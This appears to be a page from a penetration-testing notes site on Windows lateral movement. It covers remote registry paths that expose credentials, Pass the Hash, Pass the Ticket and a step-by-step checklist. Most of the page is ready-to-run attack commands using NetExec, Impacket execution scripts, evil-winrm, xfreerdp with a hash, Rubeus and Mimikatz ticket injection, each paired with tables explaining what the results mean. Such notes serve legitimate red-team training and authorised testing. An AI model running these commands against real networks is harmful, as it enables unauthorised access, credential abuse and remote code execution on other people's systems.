+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></td>
+<td>Auto-logon values.</td>
+</tr>
+<tr>
+<td><code>HKLM\SYSTEM\CurrentControlSet\Services</code></td>
+<td>Services.</td>
+</tr>
+<tr>
+<td><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</code></td>
+<td>Installed software.</td>
+</tr>
+<tr>
+<td><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></td>
+<td>Startup entries.</td>
+</tr>
+<tr>
+<td><code>HKCU\Software\SimonTatham\PuTTY\Sessions</code></td>
+<td>PuTTY sessions.</td>
+</tr>
+<tr>
+<td><code>HKU</code></td>
+<td>Loaded user hives.</td>
+</tr>
+</tbody>
+</table>
+<p>Common outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Registry query works</td>
+<td>Remote Registry access exists.</td>
+</tr>
+<tr>
+<td><code>HKU</code> shows user SIDs</td>
+<td>User hives loaded.</td>
+</tr>
+<tr>
+<td>Auto-logon values found</td>
+<td>Possible credential exposure.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Missing rights.</td>
+</tr>
+<tr>
+<td>Service stopped</td>
+<td>Start may require admin.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="pass-the-hash">Pass the Hash</h2>
+<p>Pass the Hash uses an NT hash instead of a plaintext password for NTLM authentication.</p>
+<p>It does not crack the password.</p>
+<p>It works only where NTLM authentication is accepted and the target allows the requested logon type.</p>
+<p>Common tools:</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Example use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NetExec</td>
+<td>SMB, WinRM, RDP checks with hashes.</td>
+</tr>
+<tr>
+<td>Impacket</td>
+<td>PsExec, WMIExec, SMBExec, Atexec.</td>
+</tr>
+<tr>
+<td>xfreerdp</td>
+<td>RDP Restricted Admin mode if enabled.</td>
+</tr>
+<tr>
+<td>Evil-WinRM</td>
+<td>WinRM with NT hash.</td>
+</tr>
+</tbody>
+</table>
+<p>NetExec SMB:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Command execution:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>WinRM:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>Impacket PsExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>psexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>Impacket WMIExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>Impacket SMBExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>smbexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<p>Impacket Atexec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>atexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>RDP Restricted Admin mode:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/pth:<span class="nv">$NTLM</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span><span class="w"> </span>/cert:ignore
+</span></code></pre></div>
+<p>Common result meanings:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB auth works</td>
+<td>Hash is valid and NTLM accepted.</td>
+</tr>
+<tr>
+<td><code>Pwn3d!</code></td>
+<td>Local admin over SMB target.</td>
+</tr>
+<tr>
+<td>WinRM works</td>
+<td>Remote management access with hash.</td>
+</tr>
+<tr>
+<td>RDP PTH fails</td>
+<td>Restricted Admin may not be enabled.</td>
+</tr>
+<tr>
+<td>Logon type denied</td>
+<td>Credential valid but protocol not allowed.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="pass-the-ticket">Pass the Ticket</h2>
+<p>Pass the Ticket uses a Kerberos ticket directly.</p>
+<p>It usually uses either:</p>
+<table>
+<thead>
+<tr>
+<th>Format</th>
+<th>Platform</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.ccache</code></td>
+<td>Linux / Impacket / MIT Kerberos</td>
+</tr>
+<tr>
+<td><code>.kirbi</code></td>
+<td>Windows / Rubeus / Mimikatz</td>
+</tr>
+</tbody>
+</table>
+<p>Linux ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/alice.ccache
+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>klist
+</span></code></pre></div>
+<p>Use with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a>smbexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a>atexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>Use with NetExec:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET_HOST</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$TARGET_HOST</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span></code></pre></div>
+<p>Request TGT with password:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span></code></pre></div>
+<p>Request TGT with hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span></code></pre></div>
+<p>Windows ticket injection with Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
+</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="n">klist</span>
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>mimikatz.exe
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>kerberos::ptt ticket.kirbi
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>kerberos::list
+</span></code></pre></div>
+<p>Convert ticket formats:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>ticketConverter.py<span class="w"> </span>ticket.kirbi<span class="w"> </span>ticket.ccache
+</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a>ticketConverter.py<span class="w"> </span>ticket.ccache<span class="w"> </span>ticket.kirbi
+</span></code></pre></div>
+<p>Common result meanings:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>klist</code> shows ticket</td>
+<td>Ticket cache loaded.</td>
+</tr>
+<tr>
+<td>Kerberos auth works</td>
+<td>Ticket valid for target/service.</td>
+</tr>
+<tr>
+<td><code>KRB_AP_ERR_SKEW</code></td>
+<td>Time skew problem.</td>
+</tr>
+<tr>
+<td><code>KRB_AP_ERR_MODIFIED</code></td>
+<td>SPN/key mismatch or wrong hostname.</td>
+</tr>
+<tr>
+<td>Access denied</td>
+<td>Authentication worked but authorization failed.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="lateral-movement-checklist">Lateral Movement Checklist</h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Confirm credential or ticket material</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>Plaintext password:
+</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a>NT hash:
+</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a>Kerberos TGT:
+</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a>Kerberos TGS:
+</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#__codelineno-109-5"></a>ccache:
+</span><span id="__span-109-6"><a id="__codelineno-109-6" name="__codelineno-109-6" href="#__codelineno-109-6"></a>kirbi:
+</span><span id="__span-109-7"><a id="__codelineno-109-7" name="__codelineno-109-7" href="#__codelineno-109-7"></a>Current session:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Confirm domain context</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>Domain:
+</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>NetBIOS:
+</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>Realm:
+</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a>DC:
+</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#__codelineno-110-5"></a>Target range:
+</span><span id="__span-110-6"><a id="__codelineno-110-6" name="__codelineno-110-6" href="#__codelineno-110-6"></a>DNS working:
+</span><span id="__span-110-7"><a id="__codelineno-110-7" name="__codelineno-110-7" href="#__codelineno-110-7"></a>Time synced:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Discover local admin access</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check SMB admin shares</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//<span class="nv">$TARGET</span>/<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test WinRM</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test SMB command execution</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test PsExec-style access</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>psexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test WMI execution</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test DCOM execution</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>dcomexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test scheduled task execution</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>atexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$TARGET</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test service-based execution</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>--exec-method<span class="w"> </span>smbexec
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Test RDP</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>nxc<span class="w"> </span>rdp<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>xfreerdp<span class="w"> </span>/u:<span class="nv">$USER</span><span class="w"> </span>/p:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>/d:<span class="nv">$DOMAIN</span><span class="w"> </span>/v:<span class="nv">$TARGET</span><span class="w"> </span>/cert:ignore
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check Remote Registry</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--reg-sessions
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Try Pass the Hash if NT hash is available</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Try Pass the Ticket if Kerberos ticket is available</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/ticket.ccache
+</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a>klist
+</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_HOST</span>
+</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../ACL_Abuse/" class="md-footer__link md-footer__link--prev" aria-label="Previous: ACL Abuse">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                ACL Abuse
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Priv_Escalation/" class="md-footer__link md-footer__link--next" aria-label="Next: Privilege Escalation">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Privilege Escalation
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
